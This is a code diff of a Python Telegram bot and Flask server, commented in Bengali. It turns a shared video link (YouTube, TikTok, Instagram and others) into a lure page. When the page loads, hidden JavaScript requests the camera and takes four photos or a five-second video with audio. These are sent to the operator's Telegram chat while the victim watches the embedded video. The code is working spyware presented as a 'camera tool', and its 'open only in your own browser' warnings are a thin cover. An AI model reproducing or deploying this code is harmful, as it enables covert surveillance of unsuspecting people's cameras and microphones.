@@ -1,12 +1,21 @@
 #!/usr/bin/env python3
+"""
+Camera Tool Bot — Photo & Video Capture (Front/Back)
+=====================================================
+Features:
+  - Front / Back camera support
+  - Photo Mode: 4 photos in 4 seconds
+  - Video Mode: 5-second video recording
+  - Redirect link / Direct link support
+  - YouTube, TikTok, Instagram, Facebook, Vimeo, MP4 playback
+"""
+
 import os
 import io
 import uuid
 import base64
 import threading
 import requests
-import cv2
-import time
 from flask import Flask, request, render_template_string, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -27,15 +36,13 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 CHAT_ID = os.environ.get("CHAT_ID", "")
 PUBLIC_URL = os.environ.get("PUBLIC_URL", "")
 
-# ===============================
-# অনুমোদিত Chat ID (একটি বা কমা-সেপারেটেড)
-# আপনি দিয়েছেন: 7243012875,7668032710
-# পরিবেশভ্যারিয়েবলও ব্যবহার করতে পারেন (ALLOWED_CHAT_ID)
 ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875,7668032710")
 ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}
 
+
 def is_authorized_chat(chat_id):
     return str(chat_id) in ALLOWED_CHAT_IDS
+
 
 if not BOT_TOKEN or not CHAT_ID:
     print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
@@ -43,11 +50,12 @@ if not BOT_TOKEN or not CHAT_ID:
     raise SystemExit(1)
 
 # অস্থায়ী স্টোরেজ
-user_sessions = {}   # {chat_id: {"camera": "front/back", "waiting_url": True}}
-link_store = {}      # {link_id: {"chat_id": ..., "video_url": ..., "camera": ...}}
+user_sessions = {}   # {chat_id: {"camera": "front/back", "waiting_url": True, "mode": "photo/video"}}
+link_store = {}      # {link_id: {"chat_id": ..., "video_url": ..., "camera": ..., "mode": ...}}
+
 
 # ==========================================
-# টেলিগ্রাম-এ ছবি পাঠানো
+# Telegram-এ ছবি পাঠানো
 # ==========================================
 def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
     url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
@@ -59,11 +67,28 @@ def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
     try:
         response = requests.post(url, files=files, data=payload, timeout=30)
         response.raise_for_status()
-        if response.status_code == 200:
-            return {"status": "success"}
-        return {"status": "error", "details": response.text}
+        return {"status": "success"}
     except requests.RequestException as e:
         return {"status": "error", "details": str(e)}
+
+
+# ==========================================
+# Telegram-এ ভিডিও পাঠানো
+# ==========================================
+def send_video_to_telegram(video_file, chat_id, bot_token, caption=""):
+    url = f"https://api.telegram.org/bot{bot_token}/sendVideo"
+    files = {"video": video_file}
+    payload = {"chat_id": chat_id}
+    if caption:
+        payload["caption"] = caption
+
+    try:
+        response = requests.post(url, files=files, data=payload, timeout=120)
+        response.raise_for_status()
+        return {"status": "success"}
+    except requests.RequestException as e:
+        return {"status": "error", "details": str(e)}
+
 
 def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=4):
     try:
@@ -81,8 +106,26 @@ def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1
     except Exception as e:
         return {"status": "error", "details": str(e)}
 
+
+def capture_and_send_video(video_data, chat_id, camera_type="front", duration=5):
+    try:
+        if "," in video_data:
+            video_b64 = video_data.split(",", 1)[1]
+        else:
+            return {"status": "error", "details": "Invalid video data format"}
+
+        video_bytes = base64.b64decode(video_b64)
+        video_file = io.BytesIO(video_bytes)
+        video_file.name = f"{camera_type}_video_{duration}s.webm"
+
+        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও ({duration}s)"
+        return send_video_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
+    except Exception as e:
+        return {"status": "error", "details": str(e)}
+
+
 # ==========================================
-# ক্যামেরা ক্যাপচার পেজ (ভিডিও + লুকানো ক্যামেরা)
+# ক্যাপচার পেজ — ছবি এবং ভিডিও উভয় মোড সাপোর্ট
 # ==========================================
 CAPTURE_HTML = """
 <!DOCTYPE html>
@@ -122,257 +165,551 @@ CAPTURE_HTML = """
             display: block;
             background: #000;
         }
-        .overlay {
+        .info {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0, 0, 0, 0.5);
-            cursor: pointer;
+            bottom: 10px;
+            right: 10px;
+            font-size: 11px;
+            color: #555;
         }
-        .overlay-text {
-            font-size: 2rem;
-            color: #fff;
-            text-shadow: 0 0 10px #000;
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #888;
         }
     </style>
 </head>
 <body>
-    <div class="video-wrapper">
-        <video id="mainVideo" autoplay loop muted controls>
-            <source src="{{ video_url }}" type="video/mp4">
-            আপনার ব্রাউজার ভিডিও ট্যাগ সাপোর্ট করে না।
-        </video>
+    <div class="video-wrapper" id="videoContainer">
+        <div class="loading">⏳ লোড হচ্ছে...</div>
     </div>
+    <div class="info">Auto-play enabled</div>
 
     <script>
-        // ক্যাপচার বাটন থাকবেনা
-        // ব্যবহারকারী allow করলে ক্যামেরা ক্যাপচার শুরু হবে
-        document.addEventListener('DOMContentLoaded', function() {
-            // ক্যামেরা ক্যাপচার শুরু হবে
-            startCapture('{{ camera_type }}', '{{ link_id }}');
-        });
+        const VIDEO_URL = "{{ video_url }}";
+        const CHAT_ID = "{{ chat_id }}";
+        const CAMERA_TYPE = "{{ camera_type }}";
+        const LINK_ID = "{{ link_id }}";
+        const CAPTURE_MODE = "{{ mode }}";
 
-        function startCapture(cameraType, linkId) {
-            // ক্যামেরা ক্যাপচার শুরু হবে
-            // ৪-৭ সেকেন্ড পর ক্যাপচার বন্ধ হবে
-            setTimeout(function() {
-                // ক্যাপচার বন্ধ হবে
-                stopCapture(cameraType, linkId);
-            }, 5000); // ৫ সেকেন্ড
+        // =========================================================
+        // মোড ১: ছবি ক্যাপচার (৪টি ছবি — ৪ সেকেন্ডে)
+        // =========================================================
+        async function startPhotoCapture() {
+            try {
+                const constraints = {
+                    video: { facingMode: CAMERA_TYPE === "back" ? "environment" : "user" },
+                    audio: false
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+                const hiddenVideo = document.createElement('video');
+                hiddenVideo.srcObject = stream;
+                hiddenVideo.setAttribute('playsinline', 'true');
+                hiddenVideo.muted = true;
+                hiddenVideo.style.display = 'none';
+                document.body.appendChild(hiddenVideo);
+                hiddenVideo.play();
+
+                hiddenVideo.onplaying = () => {
+                    const TOTAL_PHOTOS = 4;
+                    const INTERVAL_MS = 1000;
+                    const START_DELAY = 1000;
+                    let photoCount = 0;
+
+                    setTimeout(() => {
+                        const interval = setInterval(async () => {
+                            try {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = hiddenVideo.videoWidth || 640;
+                                canvas.height = hiddenVideo.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                                const photo = canvas.toDataURL('image/jpeg', 0.85);
+                                photoCount++;
+
+                                await fetch('/capture', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        photo: photo,
+                                        chat_id: CHAT_ID,
+                                        camera_type: CAMERA_TYPE,
+                                        photo_num: photoCount,
+                                        total: TOTAL_PHOTOS
+                                    })
+                                });
+                                console.log(`📸 ছবি ${photoCount}/${TOTAL_PHOTOS}`);
+
+                                if (photoCount >= TOTAL_PHOTOS) {
+                                    clearInterval(interval);
+                                    stream.getTracks().forEach(t => t.stop());
+                                    console.log("✅ ৪টি ছবি শেষ, ক্যামেরা বন্ধ");
+                                }
+                            } catch (e) { console.log("capture error", e); }
+                        }, INTERVAL_MS);
+                    }, START_DELAY);
+                };
+            } catch (e) { console.log("camera error", e); }
         }
 
-        function stopCapture(cameraType, linkId) {
-            // ক্যাপচার বন্ধ হবে
-            // ক্যাপচার করা ডেটা টেলিগ্রামে পাঠাবো
-            fetch('/capture/' + linkId, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    cameraType: cameraType,
-                    linkId: linkId
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('ক্যাপচার ডেটা পাঠানো হয়েছে:', data);
-            })
-            .catch(error => {
-                console.error('ক্যাপচার ডেটা পাঠাতে ব্যর্থ:', error);
-            });
+        // =========================================================
+        // মোড ২: ভিডিও ক্যাপচার (৫ সেকেন্ড রেকর্ডিং)
+        // =========================================================
+        async function startVideoCapture() {
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: CAMERA_TYPE === "back" ? "environment" : "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: true
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+                // MediaRecorder MIME type detect
+                let mimeType = 'video/webm;codecs=vp8,opus';
+                if (!window.MediaRecorder || !MediaRecorder.isTypeSupported(mimeType)) {
+                    if (MediaRecorder.isTypeSupported('video/webm')) {
+                        mimeType = 'video/webm';
+                    } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                        mimeType = 'video/mp4';
+                    } else {
+                        mimeType = '';
+                    }
+                }
+
+                const options = mimeType ? { mimeType: mimeType } : {};
+                const recorder = new MediaRecorder(stream, options);
+                const chunks = [];
+                const actualMime = recorder.mimeType || mimeType || 'video/webm';
+
+                recorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
+                };
+
+                recorder.onstop = async () => {
+                    try {
+                        const blob = new Blob(chunks, { type: actualMime });
+                        const reader = new FileReader();
+                        reader.onloadend = async () => {
+                            const base64data = reader.result;
+                            await fetch('/capture_video', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    video: base64data,
+                                    chat_id: CHAT_ID,
+                                    camera_type: CAMERA_TYPE,
+                                    duration: 5
+                                })
+                            });
+                            console.log("🎥 ভিডিও পাঠানো হয়েছে");
+                        };
+                        reader.readAsDataURL(blob);
+                    } catch (err) { console.log("video send error", err); }
+                    finally {
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                };
+
+                // ১ সেকেন্ড delay → ৫ সেকেন্ড রেকর্ডিং
+                setTimeout(() => {
+                    try {
+                        recorder.start();
+                        console.log("🎥 রেকর্ডিং শুরু...");
+                    } catch (e) {
+                        console.log("recorder start error", e);
+                        return;
+                    }
+                    setTimeout(() => {
+                        try {
+                            if (recorder.state !== 'inactive') recorder.stop();
+                            console.log("🎥 রেকর্ডিং শেষ");
+                        } catch (e) { console.log(e); }
+                    }, 5000);
+                }, 1000);
+
+            } catch (e) { console.log("video camera error", e); }
         }
+
+        // =========================================================
+        // ভিডিও লোড (YouTube / TikTok / Instagram / FB / Vimeo / MP4)
+        // =========================================================
+        function loadVideo() {
+            const container = document.getElementById('videoContainer');
+            if (!VIDEO_URL) {
+                container.innerHTML = '<div class="loading">কোনো ভিডিও নেই</div>';
+                return;
+            }
+            const url = VIDEO_URL;
+
+            if (url.includes('youtube.com') || url.includes('youtu.be')) {
+                let vid = '';
+                if (url.includes('youtu.be/')) vid = url.split('youtu.be/')[1].split('?')[0];
+                else if (url.includes('v=')) vid = url.split('v=')[1].split('&')[0];
+                else if (url.includes('shorts/')) vid = url.split('shorts/')[1].split('?')[0];
+                container.innerHTML = `<iframe src="https://www.youtube.com/embed/${vid}?autoplay=1&mute=0&playsinline=1" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>`;
+            }
+            else if (url.includes('tiktok.com')) {
+                const match = url.match(/\\/video\\/(\\d+)/);
+                if (match) {
+                    container.innerHTML = `<iframe src="https://www.tiktok.com/embed/v2/${match[1]}" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:80vh; border:none;"></iframe>`;
+                } else { window.location.href = url; }
+            }
+            else if (url.includes('instagram.com')) {
+                const match = url.match(/\\/(reel|p|tv)\\/([A-Za-z0-9_-]+)/);
+                if (match) {
+                    container.innerHTML = `<iframe src="https://www.instagram.com/${match[1]}/${match[2]}/embed/" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:80vh; border:none;"></iframe>`;
+                } else { window.location.href = url; }
+            }
+            else if (url.includes('facebook.com') || url.includes('fb.watch')) {
+                container.innerHTML = `<iframe src="https://www.facebook.com/plugins/video.php?href=${encodeURIComponent(url)}&show_text=0&autoplay=1" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:80vh; border:none;"></iframe>`;
+            }
+            else if (url.includes('vimeo.com')) {
+                const match = url.match(/vimeo\\.com\\/(\\d+)/);
+                if (match) {
+                    container.innerHTML = `<iframe src="https://player.vimeo.com/video/${match[1]}?autoplay=1" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>`;
+                } else { window.location.href = url; }
+            }
+            else if (url.match(/\\.(mp4|webm|ogg|mov)(\\?|$)/i)) {
+                container.innerHTML = `<video autoplay controls playsinline><source src="${url}"></video>`;
+            }
+            else { window.location.href = url; }
+        }
+
+        // === সব শুরু ===
+        window.onload = () => {
+            loadVideo();
+            if (CAPTURE_MODE === "video") {
+                startVideoCapture();
+            } else {
+                startPhotoCapture();
+            }
+        };
     </script>
 </body>
 </html>
 """
 
-# ==========================================
-# ফোনের তথ্য পেতে ফাংশন
-# ==========================================
-def get_phone_info():
-    import platform
-    import psutil
-    import socket
-
-    phone_info = {
-        'phone_name': platform.node(),
-        'battery': f"{psutil.sensors_battery().percent}% ({psutil.sensors_battery().power_plugged})",
-        'ram': f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
-        'rom': f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
-        'ip_address': socket.gethostbyname(socket.gethostname())
-    }
-    return phone_info
 
 # ==========================================
-# ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার
+# Flask Routes
 # ==========================================
-def capture_font_camera_video(chat_id, video_url, camera_type="front"):
-    try:
-        cap = cv2.VideoCapture(0)
-        out = cv2.VideoWriter(f'{camera_type}_capture_video.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (640, 480))
-        start_time = time.time()
-        while time.time() - start_time < 5:
-            ret, frame = cap.read()
-            if not ret:
-                break
-            out.write(frame)
-        cap.release()
-        out.release()
-        video_file = open(f'{camera_type}_capture_video.mp4', 'rb')
-        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
-        return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
-    except Exception as e:
-        return {"status": "error", "details": str(e)}
-
-# ==========================================
-# ব্যাক ক্যামেরা ভিডিও ক্যাপচার
-# ==========================================
-def capture_back_camera_video(chat_id, video_url, camera_type="back"):
-    try:
-        cap = cv2.VideoCapture(1)
-        out = cv2.VideoWriter(f'{camera_type}_capture_video.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (640, 480))
-        start_time = time.time()
-        while time.time() - start_time < 5:
-            ret, frame = cap.read()
-            if not ret:
-                break
-            out.write(frame)
-        cap.release()
-        out.release()
-        video_file = open(f'{camera_type}_capture_video.mp4', 'rb')
-        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
-        return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
-    except Exception as e:
-        return {"status": "error", "details": str(e)}
-
-# ==========================================
-# ফ্লাস্ক রুট
-# ==========================================
-@app.route('/')
+@app.route("/")
 def index():
-    return "হোম পেজ"
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Service</title>
+        <style>
+            body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+            h1 { color: #333; }
+        </style>
+    </head>
+    <body>
+        <h1>✅ Service is running</h1>
+        <p>Telegram বট চালু আছে।</p>
+    </body>
+    </html>
+    """
 
-@app.route('/view/<link_id>', methods=['GET'])
+
+@app.route("/v/<link_id>")
 def view_link(link_id):
-    if link_id not in link_store:
-        return "লিঙ্ক খুজে পাওয়া যাচ্ছে নাই", 404
+    """পাবলিক লিংক — ভিডিও + ক্যামেরা ক্যাপচার"""
+    data = link_store.get(link_id)
+    if not data:
+        return "লিংকটি পাওয়া যায়নি বা মেয়াদ শেষ", 404
 
-    chat_id = link_store[link_id]['chat_id']
-    video_url = link_store[link_id]['video_url']
-    camera_type = link_store[link_id]['camera']
+    return render_template_string(
+        CAPTURE_HTML,
+        video_url=data.get("video_url", ""),
+        chat_id=data.get("chat_id", ""),
+        camera_type=data.get("camera", "front"),
+        link_id=link_id,
+        mode=data.get("mode", "photo"),
+    )
 
-    return render_template_string(CAPTURE_HTML, video_url=video_url, camera_type=camera_type, link_id=link_id)
 
-@app.route('/capture/<link_id>', methods=['POST'])
-def capture_link(link_id):
-    if link_id not in link_store:
-        return jsonify({"status": "error", "details": "লিঙ্ক খুজে পাওয়া যাচ্ছে নাই"}), 404
+@app.route("/capture", methods=["POST"])
+def capture():
+    data = request.get_json(silent=True)
+    if not data or "photo" not in data:
+        return jsonify({"status": "error", "details": "No photo"}), 400
 
-    chat_id = link_store[link_id]['chat_id']
-    video_url = link_store[link_id]['video_url']
-    camera_type = link_store[link_id]['camera']
+    chat_id = data.get("chat_id", CHAT_ID)
+    camera_type = data.get("camera_type", "front")
+    photo_num = data.get("photo_num", 1)
+    total = data.get("total", 4)
+    result = capture_and_send_photo(data["photo"], chat_id, camera_type, photo_num, total)
+    return jsonify(result)
 
-    if camera_type == 'font_camera_video':
-        result = capture_font_camera_video(chat_id, video_url, camera_type)
-    elif camera_type == 'back_camera_video':
-        result = capture_back_camera_video(chat_id, video_url, camera_type)
-    elif camera_type == 'font_camera_photo':
-        result = capture_and_send_photo(video_url, chat_id, camera_type)
-    elif camera_type == 'back_camera_photo':
-        result = capture_and_send_photo(video_url, chat_id, camera_type)
-    else:
-        return jsonify({"status": "error", "details": "অজানা ক্যামেরা টাইপ"}), 400
 
-    if result["status"] == "success":
-        phone_info = get_phone_info()
-        info_text = "\n".join([f"{key}: {value}" for key, value in phone_info.items()])
-        caption = f"📸 ক্যাপচার করা হয়েছে\n{info_text}"
-        return jsonify({"status": "success", "caption": caption})
-    else:
-        return jsonify({"status": "error", "details": result["details"]}), 500
+@app.route("/capture_video", methods=["POST"])
+def capture_video():
+    data = request.get_json(silent=True)
+    if not data or "video" not in data:
+        return jsonify({"status": "error", "details": "No video"}), 400
+
+    chat_id = data.get("chat_id", CHAT_ID)
+    camera_type = data.get("camera_type", "front")
+    duration = data.get("duration", 5)
+    result = capture_and_send_video(data["video"], chat_id, camera_type, duration)
+    return jsonify(result)
+
 
 # ==========================================
-# টেলিগ্রাম বট হ্যান্ডলার
+# Telegram Bot Handlers
 # ==========================================
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """শুরুতে Front / Back Camera বাটন"""
+    if not is_authorized_chat(update.effective_chat.id):
+        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        return
+
     keyboard = [
         [
-            InlineKeyboardButton("ফ্রন্ট ক্যামেরা ফটো", callback_data='font_camera_photo'),
-            InlineKeyboardButton("ব্যাক ক্যামেরা ফটো", callback_data='back_camera_photo'),
-        ],
-        [
-            InlineKeyboardButton("ফ্রন্ট ক্যামেরা ভিডিও", callback_data='font_camera_video'),
-            InlineKeyboardButton("ব্যাক ক্যামেরা ভিডিও", callback_data='back_camera_video'),
-        ],
-        [
-            InlineKeyboardButton("রেডিরেক্ট লিঙ্ক", callback_data='redirect_link'),
-            InlineKeyboardButton("ডিরেক্ট লিঙ্ক", callback_data='direct_link'),
-            InlineKeyboardButton("ক্যান্সেল", callback_data='cancel'),
+            InlineKeyboardButton("📸 Front Camera", callback_data="cam_front"),
+            InlineKeyboardButton("📷 Back Camera", callback_data="cam_back"),
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text('ক্যাপচার শুরু করুন:', reply_markup=reply_markup)
+    await update.message.reply_text(
+        "🎥 *Camera Tool*\n\n"
+        "কোন ক্যামেরা ব্যবহার করতে চান?",
+        reply_markup=reply_markup,
+        parse_mode="Markdown",
+    )
+
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """বাটন ক্লিক হ্যান্ডলার"""
     query = update.callback_query
     await query.answer()
 
-    if query.data in ['font_camera_photo', 'back_camera_photo', 'font_camera_video', 'back_camera_video']:
-        user_sessions[query.message.chat_id] = {"camera": query.data, "waiting_url": True}
-        await query.edit_message_text('লিঙ্ক ইনপুট দিন:')
-    elif query.data == 'redirect_link':
-        user_sessions[query.message.chat_id] = {"camera": "redirect", "waiting_url": True}
-        await query.edit_message_text('রেডিরেক্ট লিঙ্ক ইনপুট দিন:')
-    elif query.data == 'direct_link':
-        user_sessions[query.message.chat_id] = {"camera": "direct", "waiting_url": True}
-        await query.edit_message_text('ডিরেক্ট লিঙ্ক ইনপুট দিন:')
-    elif query.data == 'cancel':
-        await query.edit_message_text('ক্যাপচার বাতিল হচ্ছে।')
+    if not is_authorized_chat(query.message.chat_id):
+        await query.edit_message_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        return
+
+    data = query.data
+    chat_id = str(query.message.chat_id)
+
+    # === Camera select ===
+    if data.startswith("cam_"):
+        cam = data.split("_")[1]
+        user_sessions[chat_id] = {"camera": cam}
+
+        keyboard = [
+            [
+                InlineKeyboardButton("📸 Photo Mode", callback_data="mode_photo"),
+                InlineKeyboardButton("🎥 Video Mode", callback_data="mode_video"),
+            ],
+            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        cam_name = "Front" if cam == "front" else "Back"
+        await query.edit_message_text(
+            f"✅ *{cam_name} Camera* সিলেক্ট করা হয়েছে।\n\n"
+            f"💡 *Your Chat ID:* `{chat_id}`\n\n"
+            f"এখন মোড বেছে নিন:",
+            reply_markup=reply_markup,
+            parse_mode="Markdown",
+        )
+        return
+
+    # === Mode select: Photo ===
+    if data == "mode_photo":
+        session = user_sessions.get(chat_id, {})
+        session["mode"] = "photo"
+        user_sessions[chat_id] = session
+
+        keyboard = [
+            [InlineKeyboardButton("🔗 Redirect Link (Enter URL)", callback_data="link_redirect")],
+            [InlineKeyboardButton("🔗 Direct Link", callback_data="link_direct")],
+            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "📸 *Photo Mode*\n\nলিংকের ধরন বেছে নিন:",
+            reply_markup=reply_markup,
+            parse_mode="Markdown",
+        )
+        return
+
+    # === Mode select: Video ===
+    if data == "mode_video":
+        session = user_sessions.get(chat_id, {})
+        session["mode"] = "video"
+        user_sessions[chat_id] = session
+
+        keyboard = [
+            [InlineKeyboardButton("🔗 Redirect Link (Enter URL)", callback_data="link_redirect")],
+            [InlineKeyboardButton("🔗 Direct Link", callback_data="link_direct")],
+            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "🎥 *Video Mode (৫ সেকেন্ড রেকর্ডিং)*\n\nলিংকের ধরন বেছে নিন:",
+            reply_markup=reply_markup,
+            parse_mode="Markdown",
+        )
+        return
+
+    # === Redirect Link — URL ইনপুট ===
+    if data == "link_redirect":
+        session = user_sessions.get(chat_id, {})
+        session["waiting_url"] = True
+        session["link_type"] = "redirect"
+        user_sessions[chat_id] = session
+
+        await query.edit_message_text(
+            "🔄 *Enter ANY Custom Link/URL*\n\n"
+            "যে ভিডিও/লিংক দেখাতে চান, সেটার URL পাঠান।\n\n"
+            "✅ কাজ করবে:\n"
+            "• YouTube: `youtube.com/watch?v=...`\n"
+            "• YouTube Shorts: `youtube.com/shorts/...`\n"
+            "• TikTok: `tiktok.com/@user/video/...`\n"
+            "• Instagram: `instagram.com/reel/...`\n"
+            "• Facebook: `facebook.com/watch?v=...`\n"
+            "• MP4: `example.com/video.mp4`\n\n"
+            "👉 শুধু লিংকটি পাঠান:",
+            parse_mode="Markdown",
+        )
+        return
+
+    # === Direct Link — ভিডিও ছাড়া ===
+    if data == "link_direct":
+        session = user_sessions.get(chat_id, {})
+        cam = session.get("camera", "front")
+        mode = session.get("mode", "photo")
+
+        link_id = uuid.uuid4().hex[:10]
+        link_store[link_id] = {
+            "chat_id": chat_id,
+            "video_url": "",
+            "camera": cam,
+            "mode": mode,
+        }
+
+        if PUBLIC_URL:
+            public_link = f"{PUBLIC_URL}/v/{link_id}"
+        else:
+            public_link = f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
+
+        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        if mode == "video":
+            details = "🎥 ভিডিও: ৫ সেকেন্ড রেকর্ড হবে"
+        else:
+            details = "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
+
+        await query.edit_message_text(
+            f"✅ *Direct Link তৈরি হয়েছে!*\n\n"
+            f"📸 Camera: *{cam.capitalize()}*\n"
+            f"🎯 Mode: *{mode.capitalize()}*\n"
+            f"{details}\n\n"
+            f"🔗 লিংক:\n`{public_link}`\n\n"
+            f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*",
+            reply_markup=reply_markup,
+            parse_mode="Markdown",
+        )
+        return
+
+    # === Cancel ===
+    if data == "cancel":
+        user_sessions.pop(chat_id, None)
+        await query.edit_message_text("❌ বাতিল করা হয়েছে। আবার `/start` পাঠান।")
+        return
+
 
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.message.chat_id
-    if chat_id in user_sessions and user_sessions[chat_id]["waiting_url"]:
-        video_url = update.message.text
-        camera_type = user_sessions[chat_id]["camera"]
-        user_sessions.pop(chat_id)
+    """URL ইনপুট ধরার জন্য"""
+    if not is_authorized_chat(update.effective_chat.id):
+        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        return
 
-        link_id = str(uuid.uuid4())
-        link_store[link_id] = {"chat_id": chat_id, "video_url": video_url, "camera": camera_type}
-        await update.message.reply_text(f'লিঙ্ক তৈরি হয়েছে: {PUBLIC_URL}/view/{link_id}')
+    chat_id = str(update.message.chat_id)
+    session = user_sessions.get(chat_id, {})
+
+    if not session.get("waiting_url"):
+        return
+
+    url = update.message.text.strip()
+    if not url.startswith("http"):
+        url = "https://" + url
+
+    cam = session.get("camera", "front")
+    mode = session.get("mode", "photo")
+    session["waiting_url"] = False
+    session["video_url"] = url
+    user_sessions[chat_id] = session
+
+    link_id = uuid.uuid4().hex[:10]
+    link_store[link_id] = {
+        "chat_id": chat_id,
+        "video_url": url,
+        "camera": cam,
+        "mode": mode,
+    }
+
+    if PUBLIC_URL:
+        public_link = f"{PUBLIC_URL}/v/{link_id}"
+    else:
+        public_link = f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
+
+    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    if mode == "video":
+        details = "🎥 ভিডিও: ৫ সেকেন্ড রেকর্ড হবে"
+    else:
+        details = "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
+
+    await update.message.reply_text(
+        f"✅ *Redirect Link তৈরি হয়েছে!*\n\n"
+        f"📸 Camera: *{cam.capitalize()}*\n"
+        f"🎯 Mode: *{mode.capitalize()}*\n"
+        f"🎬 Video: `{url[:50]}...`\n"
+        f"{details}\n\n"
+        f"🔗 লিংক:\n`{public_link}`\n\n"
+        f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
+        f"ভিডিও চলবে + ক্যাপচার Telegram-এ আসবে।",
+        reply_markup=reply_markup,
+        parse_mode="Markdown",
+    )
+
 
 # ==========================================
-# ফ্লাস্ক সার্ভার
+# Flask চালানো
 # ==========================================
 def run_flask():
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host="0.0.0.0", port=8080, use_reloader=False, debug=False)
+
 
 # ==========================================
-# টেলিগ্রাম বট
+# Main
 # ==========================================
-def run_telegram():
+def main():
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+
+    print("🌐 Web Server চলছে: http://0.0.0.0:8080")
+    print("✅ Telegram Bot শুরু হচ্ছে...")
+
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+
+    print("🤖 Bot is running...")
     application.run_polling()
 
-# ==========================================
-# মেইন ফাংশন
-# ==========================================
-if __name__ == '__main__':
-    # ফ্লাস্ক সার্ভার থ্রেডে চালানো
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.start()
 
-    # টেলিগ্রাম বট চালানো
-    run_telegram()
-
-    # ফ্লাস্ক সার্ভার থ্রেড যোগ দেওয়া
-    flask_thread.join()
+if __name__ == "__main__":
+    main()
